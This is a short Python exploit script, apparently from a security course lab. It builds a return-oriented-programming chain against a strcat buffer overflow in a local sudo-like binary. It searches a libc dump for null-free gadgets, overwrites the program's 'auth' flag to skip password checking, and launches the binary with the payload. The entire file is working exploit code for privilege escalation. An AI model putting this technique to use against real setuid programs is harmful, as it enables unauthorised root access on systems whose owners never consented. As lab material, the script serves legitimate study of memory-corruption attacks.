import os, sys, struct

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.AUTH` to get the address of the `auth` variable.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
    offset = 66
    nop = '\x90'
    pop_eax = search.find("pop eax", condition=has_null_byte)
    pop_edx = search.find("pop edx", condition=has_null_byte)
    inc_edx = search.find("inc edx", condition=has_null_byte)
    mov_eax_edx = search.find("mov [eax], edx", condition=has_null_byte)
    return nop * offset + struct.pack("<IIIiIIII", pop_eax, addresses.AUTH, pop_edx, -1, inc_edx, inc_edx, mov_eax_edx, addresses.ORIGINAL_RA_CHECK_PASSWORD)
    # return nop * offset + struct.pack("<LLL", pop_eax, addresses.AUTH, mov_eax_1)

    

def has_null_byte(address):
    # Checks if the address has a null byte
    # This will be used as a condition to the GadgetSearch because this is a problem since the vulnerability is strcat and we can not allow a null byte.
    mask = 0x000000ff
    if (address & mask) == 0:
        return False
    if (address & (mask << 8)) == 0:
        return False
    if (address & (mask << 16)) == 0:
        return False
    if (address & (mask << 24)) == 0:
        return False

    return True



def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
